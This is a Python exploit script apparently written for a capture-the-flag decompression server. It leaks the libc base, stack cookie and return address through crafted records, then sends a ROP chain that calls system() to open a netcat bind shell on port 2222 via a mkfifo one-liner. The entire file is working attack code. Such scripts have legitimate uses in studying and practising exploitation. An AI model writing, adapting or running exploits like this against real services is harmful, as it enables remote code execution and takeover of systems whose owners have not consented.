#!/usr/bin/python

import socket
import sys
import struct

HOST = '127.0.0.1'
PORT = 5001

header = "Welcome on this super secure decompression server! Good luck breaking it!\n"
liste = []

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST,PORT))

s.send("\x01\x00\xff\x01")
s.send("\xff")

s.shutdown(socket.SHUT_WR)

s.recv(len(header)+2)
tmp = s.recv(1024)
while tmp:
    if len(tmp) > 2 :
        liste.append(tmp)
    sys.stdout.write(tmp)
    tmp = s.recv(1024)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST,PORT))

s.send("\x00\xff"+"A"*255)
s.send("\x00\xff"+"A"*255)
s.send("\x00\xff"+"A"*255)
s.send("\x00\xff"+"A"*255)
s.send("\x00\x04"+"A"*4)

s.send("\x01\x00\xff\x01")
s.send("\xff")

s.shutdown(socket.SHUT_WR)

s.recv(len(header)+2)
tmp = s.recv(1024)
while tmp:
    if len(tmp) > 2 :
        liste.append(tmp)
    sys.stdout.write(tmp)
    tmp = s.recv(1024)

base_address_libc = int(liste[0][136:144][::-1].encode('hex'),16) - 15744
cookie = int(liste[2][8:16][::-1].encode('hex'),16)
rbp = int(liste[2][16:24][::-1].encode('hex'),16)
rip = int(liste[2][24:32][::-1].encode('hex'),16)

base_address_chall = rip - 4225
gadget_pop_rdi_retn = base_address_chall + 0x1103
address_system = 283536 + base_address_libc
address_exit = 237616 + base_address_libc
address_payload = rbp - 0x510

print "Cookie   : 0x%X"%cookie
print "RBP      : 0x%X"%rbp
print "RIP      : 0x%X"%rip
print "LIBC     : 0x%X"%base_address_libc
print "CHALL    : 0x%X"%base_address_chall

values = {
	1: cookie,
	3: gadget_pop_rdi_retn,
	4: address_payload,
	5: address_system,
	6: address_exit
}

#payload = 'touch /tmp/a'+'\x00'
payload = 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -lvp 2222 >/tmp/f'+'\x00'

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST,PORT))

s.send("\x00\xff"+payload+"A"*(255-len(payload)))
s.send("\x00\xff"+"A"*255)
s.send("\x00\xff"+"A"*255)
s.send("\x00\x04"+"A"*4)

for i in xrange(31):
    print "send %d, 0x%X"% (i,values.get(i, 0))
    s.send("\x00\x08"+struct.pack('<Q', values.get(i, 0)))

s.send("\x00\x07"+"\x11"*7)
s.send("\x01\xff\xff\x01")
s.send("\xff")
